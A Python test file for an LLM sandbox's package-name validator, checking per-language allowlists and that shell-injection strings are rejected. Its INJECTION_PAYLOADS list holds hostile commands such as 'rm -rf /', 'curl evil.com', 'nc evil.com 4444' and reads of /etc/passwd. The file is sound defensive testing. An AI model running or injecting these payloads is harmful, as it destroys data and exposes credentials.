"""Tests for llm_sandbox.security.package_validators.

The validator guards language-handler install paths from shell injection
via attacker-controlled ``libraries`` values. These tests cover the
allowlist patterns per language plus a battery of injection attempts and
edge cases.
"""

from __future__ import annotations

import pytest

from llm_sandbox.exceptions import ValidationError
from llm_sandbox.security import (
    PACKAGE_NAME_PATTERNS,
    validate_package_name,
)

INJECTION_PAYLOADS = [
    "foo; rm -rf /",
    "foo && curl evil.com",
    "foo || cat /etc/passwd",
    "foo | nc evil.com 4444",
    "foo $(whoami)",
    "foo `pwd`",
    "foo\nrm -rf /",
    "foo > /etc/shadow",
    "--upgrade-strategy eager",
    "foo bar",
    "foo'baz",
    'foo"baz',
]


class TestPackageNamePatternsRegistry:
    """Test cases for the PACKAGE_NAME_PATTERNS registry."""

    def test_all_expected_languages_registered(self) -> None:
        """Every language called out in the issue ships with a pattern."""
        expected = {"python", "javascript", "node", "go", "ruby", "r", "cpp", "c", "java"}
        assert expected.issubset(set(PACKAGE_NAME_PATTERNS))

    def test_patterns_are_anchored(self) -> None:
        """Patterns must be fully anchored to prevent partial matches."""
        for language, pattern in PACKAGE_NAME_PATTERNS.items():
            assert pattern.pattern.startswith("^"), f"{language} not anchored at start"
            assert pattern.pattern.endswith("$"), f"{language} not anchored at end"


class TestValidPython:
    """Valid Python identifiers pass and round-trip cleanly."""

    @pytest.mark.parametrize(
        "library",
        [
            "requests",
            "Django>=4.2",
            "numpy==1.26.0",
            "package[extra1,extra2]",
            "requests>=2.0,<3.0",
            "pkg_underscore",
            "dotted.name",
            "scipy~=1.11",
            "wheel!=0.40.0",
        ],
    )
    def test_valid_python_packages(self, library: str) -> None:
        """Common PEP 508 shapes are accepted."""
        assert validate_package_name(library, "python") == library


class TestValidJavaScriptAndNode:
    """Valid npm-style identifiers pass for both javascript and node."""

    @pytest.mark.parametrize(
        "library",
        [
            "lodash",
            "@types/node",
            "react@18.2.0",
            "@scope/pkg@1.0.0-beta",
            "kebab-case-pkg",
        ],
    )
    @pytest.mark.parametrize("language", ["javascript", "node"])
    def test_valid_javascript_packages(self, library: str, language: str) -> None:
        """Npm package shapes are accepted for both javascript and node."""
        assert validate_package_name(library, language) == library


class TestValidGo:
    """Valid Go module paths pass."""

    @pytest.mark.parametrize(
        "library",
        [
            "github.com/Azure/go-autorest",
            "golang.org/x/crypto",
            "example.com/mod@v1.2.3",
            "mod@v0.0.0-20230101010101-abcdef123456",
        ],
    )
    def test_valid_go_modules(self, library: str) -> None:
        """Go module paths plus optional pseudo-versions are accepted."""
        assert validate_package_name(library, "go") == library


class TestValidRuby:
    """Valid Ruby gem identifiers pass."""

    @pytest.mark.parametrize(
        "library",
        [
            "rails",
            "nokogiri:1.15.0",
            "rake-13",
        ],
    )
    def test_valid_ruby_gems(self, library: str) -> None:
        """Gem name plus optional ``:version`` suffix is accepted."""
        assert validate_package_name(library, "ruby") == library


class TestValidR:
    """Valid CRAN identifiers pass; R has no underscore/hyphen support."""

    @pytest.mark.parametrize("library", ["ggplot2", "data.table", "Rcpp"])
    def test_valid_r_packages(self, library: str) -> None:
        """CRAN names start with a letter and only allow dots."""
        assert validate_package_name(library, "r") == library

    @pytest.mark.parametrize("library", ["data_table", "data-table", "1abc"])
    def test_invalid_r_packages(self, library: str) -> None:
        """Underscores, hyphens, leading digits are rejected for R."""
        with pytest.raises(ValidationError):
            validate_package_name(library, "r")


class TestValidCAndCpp:
    """Valid Debian-style apt package names pass for c and cpp."""

    @pytest.mark.parametrize(
        "library",
        [
            "libssl-dev",
            "g++",
            "python3.11-dev",
            "gcc-12",
        ],
    )
    @pytest.mark.parametrize("language", ["c", "cpp"])
    def test_valid_apt_packages(self, library: str, language: str) -> None:
        """Debian binary package names pass for both c and cpp."""
        assert validate_package_name(library, language) == library


class TestValidJava:
    """Valid Maven coordinates pass."""

    @pytest.mark.parametrize(
        "library",
        [
            "org.apache.commons:commons-lang3",
            "com.fasterxml.jackson.core:jackson-databind:2.15.0",
        ],
    )
    def test_valid_java_coords(self, library: str) -> None:
        """Maven groupId:artifactId[:version] coords are accepted."""
        assert validate_package_name(library, "java") == library


class TestInjectionAttempts:
    """Shell-metacharacter payloads must be rejected for every language."""

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_python_rejects_injection(self, payload: str) -> None:
        """Each shell-metacharacter payload is rejected for python."""
        with pytest.raises(ValidationError, match="not a valid python package"):
            validate_package_name(payload, "python")

    @pytest.mark.parametrize("payload", [*INJECTION_PAYLOADS, "foo<file"])
    def test_cpp_rejects_injection(self, payload: str) -> None:
        """Each shell-metacharacter payload is rejected for cpp.

        ``foo<file`` is included here because the cpp pattern correctly
        rejects ``<`` (it is not a valid Debian package character).
        """
        with pytest.raises(ValidationError, match="not a valid cpp package"):
            validate_package_name(payload, "cpp")

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    @pytest.mark.parametrize(
        "language",
        ["javascript", "node", "go", "ruby", "r", "c", "java"],
    )
    def test_all_languages_reject_injection(
        self, payload: str, language: str
    ) -> None:
        """Sweep: every other language rejects every injection payload."""
        with pytest.raises(ValidationError):
            validate_package_name(payload, language)

    @pytest.mark.parametrize("payload", ["foo<file", "foo>file"])
    def test_python_rejects_redirects(self, payload: str) -> None:
        """Shell redirect payloads are rejected for python.

        PEP 440 versions must start with a digit, so the version-specifier
        branch refuses ``<file``/``>file`` which would otherwise look like
        ``<version`` / ``>version``.
        """
        with pytest.raises(ValidationError):
            validate_package_name(payload, "python")


class TestEdgeCases:
    """Edge cases on the wrapper around the regex registry."""

    def test_empty_string_rejected(self) -> None:
        """Empty input is rejected with a clear message."""
        with pytest.raises(ValidationError, match="non-empty string"):
            validate_package_name("", "python")

    def test_whitespace_only_rejected(self) -> None:
        """Whitespace-only input is rejected after trimming."""
        with pytest.raises(ValidationError, match="non-empty string"):
            validate_package_name("   ", "python")

    def test_none_rejected(self) -> None:
        """``None`` is rejected at the type-guard layer."""
        with pytest.raises(ValidationError, match="non-empty string"):
            validate_package_name(None, "python")  # type: ignore[arg-type]

    @pytest.mark.parametrize("value", [123, 1.5, [], {}, ("requests",), b"requests"])
    def test_non_string_types_rejected(self, value: object) -> None:
        """Non-string types are rejected before any regex work happens."""
        with pytest.raises(ValidationError, match="non-empty string"):
            validate_package_name(value, "python")  # type: ignore[arg-type]

    def test_leading_trailing_whitespace_trimmed(self) -> None:
        """Surrounding whitespace is stripped and the trimmed value returned."""
        assert validate_package_name("  requests  ", "python") == "requests"
        assert (
            validate_package_name("\tnumpy==1.26.0\n", "python") == "numpy==1.26.0"
        )

    @pytest.mark.parametrize("language", ["PYTHON", "Python", "python", "PyThOn"])
    def test_language_lookup_is_case_insensitive(self, language: str) -> None:
        """Language string is normalized via ``.lower()``."""
        assert validate_package_name("requests", language) == "requests"

    def test_unknown_language_safe_charset_accepts_clean_name(self) -> None:
        """Unknown language falls back to the strict safe-charset rule."""
        assert validate_package_name("some-pkg", "haskell") == "some-pkg"

    def test_unknown_language_safe_charset_rejects_metacharacters(self) -> None:
        """Unknown language rejects anything outside the safe charset."""
        with pytest.raises(ValidationError, match="safe-charset fallback"):
            validate_package_name("some;pkg", "haskell")

    def test_empty_language_falls_back_to_safe_charset(self) -> None:
        """Empty language string takes the unknown-language path."""
        assert validate_package_name("requests", "") == "requests"
        with pytest.raises(ValidationError, match="safe-charset fallback"):
            validate_package_name("foo;bar", "")


class TestReturnValue:
    """The validator returns the trimmed identifier on success."""

    def test_returns_trimmed_identifier(self) -> None:
        """Trimmed string is returned for round-trip into install commands."""
        assert validate_package_name("  requests  ", "python") == "requests"

    def test_returns_input_when_already_clean(self) -> None:
        """No-trim input is returned unchanged."""
        assert validate_package_name("lodash", "javascript") == "lodash"
        assert (
            validate_package_name("github.com/Azure/go-autorest", "go")
            == "github.com/Azure/go-autorest"
        )
